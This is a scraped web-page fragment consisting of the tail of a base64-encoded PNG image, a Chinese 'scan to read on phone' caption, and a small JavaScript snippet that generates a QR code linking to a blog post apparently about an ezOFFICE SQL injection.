z1NNAOepSwvAteTdA65HD8ufGOyRJoDz1MOqVYB9sHPq6QHXkofB+lhIxJtffwJjIeDt9NuBWYc5r/48CeFaUwzuBbO0DphrcJ3XfrD37PrVW+P4wf3gnwXS41NcEX3F1ac4HsVCcvD1kqsmjIVE/B2+r3J1AuOf32PQhiqig7eZWvTKYE+0eMF68tTBOhBp+9+ewPSJaDN8BqtZ0WDuBedg/hyxEVhPv3grtgDsjQxzrl6wBmtObxhm3/2G5GT+CE8LAW8r96aNC8nBddg5tTC4ljwMa301Pz1heSpgPUv++BSvkHo4HiDhxsBTbyrYB/vPn8w/41yk16eFxHTz605g+h9UuQ3YNw5E3r7HZ6sqJA5LE4Dp6Uq9MyD7hJUHGPNgfwrBWm0Ga2CuNcUw67lWrcHsUe1ZwNwL67xeV7PBvvGG9KIMK4CbUlMfWANzamF5hORgH5hrrXuSy1MRPawa7POUnyE93+HM7L3RK3dP8njA9xs9PBaS5ObXn8Dlx95sszN4u7B/++ie5PkrgnuSVwbXznrA9dqjuPulBeAeMEc/64kuPvOCZ8HM8QMJDwxs33JhP7duvN+QfiIvzr+0EPCW9RQJunewpngFWNfVL6hHLCgWFAuKrwD7bPkF2LXaC9Zh5nhg11caHJ9qXU8A9ypOb1ia0HNwT9e/tJA03/z/O4HpYy/MW8tlwbo2LURXHIA9YI4nHF8Y7ANiOXC8KQDj+3DyyjDX0huu3lUc34rjB18jHnCeuhiswcyqCWA9M6RV3G9IPY0/EC8XAt5i7i/bhFkHYln+0rgVPwJgeroz86M0dEDhALBpcPzeDa7XGaOxfAF7wJxSesLgOhw5PeH09LzrqYt7LTn4evJULBdSDXf8uycwFgLrbcGsZ7tfucWzHvBs1b8yT171CIoFOL5F0p+B5ghXXtUF8D3DzOkFEm4MjLdd/QI4jwGcg3ksJMWbX38Cy9/U+22BtwfmXq85zB54nNf+r8Tg2asnT9oK4J5cB/a8+2GvxS/uPmlBryVPvXPq4fsN6Sf04nz5e0i2dca5Z9UTf5c1I4D5iYye2clh9qmeWhjsAbM8FTDr6qt1x/NXeQRwL8wsN8waOFetQnMEmOv3G1JP6Q/EYyHaVAXMW8t9wlGHoxa/uM6tsWoBzDPig1mHOe/94DqQ0vb7ETB92tkMnwG4DnwqOwGjd1fmKPc7q3MGntG9PR8LmVvftr/EIx3OP26CbwDMV7P6TcG652xG+sXxKBaSd1atQvXk4OsnD8sj9FxakFrn1MGzYc3LhaT55t8/gfGxF9bbgrWe29RTkDgsrSI6rGfBrscbzhywJ3pnoEtbDlx+u9mMFwGsZ+T+Vq2w7unezAjfb0g/oRfnYyHZziN+5l7BTwaY+8w+Q/VoioXknVUTVnrXYL5+rz+Tg2fEC87BHH3Fuk9hVZOmmgDzrLEQGW78jROYFgLeFsx8dqvAVgLG92ptvQKsx5hacnHXksPcC+scrAMat0SfCYz7rWawFm9qyTunXhk8A2aOJzPA9ejgfFpIijf/f0/gavo/W0jfPHjjuTjMefypi8EeMMdzxuo5Q3rO6l2PXwzz9bsXXAdz6up9hEfef7aQXOjmn53AjxcCfkrAnNvJk5L8Ge494Jmw5jozveHUwL3JUw/DXgfHvQbWMyO88qUWBveCuevJwz9eSAbd/G9OYFpINt757FLy9Zo0AfxEKK4A67Dz2YzaV+P4V1pqncHX63pmVB3W3upRDPbVGWBN9SukB2b/tJCrAXftd05gLAS8Jbjm1S1l0+F4eg6e3fX4VwzugZnjBevKYY9r3q8H9sGR4w1rjtBzaRXgWSvtrBfc0+tjIXXQHb/2BP4HAAD//3tukAQAAAAGSURBVAMAB3sG1z38NJcAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-gov\_documentmanager-jigeObj\_iframe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 